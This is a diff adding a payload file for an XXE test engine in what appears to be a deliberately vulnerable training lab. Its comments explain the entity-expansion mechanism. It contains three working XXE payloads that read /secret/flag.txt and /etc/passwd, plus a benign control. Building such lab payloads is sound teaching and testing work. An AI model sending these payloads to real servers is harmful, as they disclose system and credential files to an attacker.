@@ -1,0 +1,37 @@
+# XML External Entity (XXE) payloads for weblab's xxe engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. These are the raw XML documents the engine POSTs (as the request
+# body, Content-Type: application/xml) to the /xml sink. That handler parses the
+# body with a SAX parser that has external general entities (XXE) ENABLED, so a
+# DOCTYPE that declares an external SYSTEM entity is expanded by reading the
+# named file off the server -- and because the parsed character data is echoed
+# back verbatim ("Parsed note: ..."), the file's contents leak straight into the
+# response. The planted secret/flag.txt is the prize.
+#
+# The anatomy of the headline payload:
+#
+#   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///secret/flag.txt"> ]>
+#                   ^^^^^^^^^^^^ external general entity declaration; SYSTEM +
+#                                a file:// URI tells the parser to fetch a file.
+#   <foo>&xxe;</foo>
+#         ^^^^^ the entity REFERENCE -- this is what forces the read. Declaring
+#               the entity is not enough; it must be referenced in the body for
+#               the parser to expand (and thus leak) it.
+#
+# Families below: the classic file read (the secret flag), the same primitive
+# pointed at the planted etc/passwd (XXE is a general file-disclosure tool, not
+# just a one-file trick), a path variant without the file:// scheme prefix, and
+# a "no-DOCTYPE" benign control that must leak nothing.
+
+# --- the headline read: leak the planted secret/flag.txt (the prize) ---
+<?xml version="1.0"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///secret/flag.txt"> ]><data>&xxe;</data>
+
+# --- same primitive, scheme-less SYSTEM path (the resolver strips file://) ---
+<?xml version="1.0"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "/secret/flag.txt"> ]><data>&xxe;</data>
+
+# --- XXE as a general file-read: dump the planted etc/passwd decoy ---
+<?xml version="1.0"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data>&xxe;</data>
+
+# --- benign control: well-formed XML, NO DOCTYPE/entity -- must leak nothing ---
+<?xml version="1.0"?><data>just a harmless note</data>
